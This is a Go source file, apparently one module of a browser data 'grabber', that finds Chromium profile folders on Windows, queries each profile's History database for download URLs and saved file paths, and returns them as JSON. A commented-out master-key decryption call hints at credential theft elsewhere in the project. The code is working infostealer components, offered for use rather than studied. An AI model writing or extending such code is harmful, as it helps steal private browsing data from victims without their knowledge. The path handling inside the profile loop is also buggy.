package downloads

import (
	"database/sql"
	"encoding/json"
	"os"

	"example.com/grabber/browsers/util"
	_ "github.com/mattn/go-sqlite3"
)

type Downloads struct {
	Tab_url     string `json:"tab_url"`
	Target_path string `json:"target_path"`
}

func Get() string {
	var downloads []Downloads
	dpPaths := util.GetBPth()
	extraPaths := util.GetProfiles()
	for _, path := range dpPaths {
		// check if the path exists
		if _, err := os.Stat(path); os.IsNotExist(err) {
			continue
		}
		//master_key := decryption.GetMasterKey(path + "\\Local State")
		for _, profile := range extraPaths {
			if _, err := os.Stat(path + "\\" + profile); os.IsNotExist(err) {
				continue
			}
			path = path + "\\" + profile
			db, err := sql.Open("sqlite3", path+"\\History")
			if err != nil {
				continue
			}
			defer db.Close()

			row, err := db.Query("SELECT tab_url, target_path FROM downloads")
			if err != nil {
				continue
			}
			defer row.Close()

			for row.Next() {
				var tab_url string
				var target_path string
				row.Scan(&tab_url, &target_path)
				downloads = append(downloads, Downloads{tab_url, target_path})
			}
		}
	}
	jsonData, err := json.MarshalIndent(downloads, "", "    ")
	if err != nil {
		return ""
	}
	return string(jsonData)
}
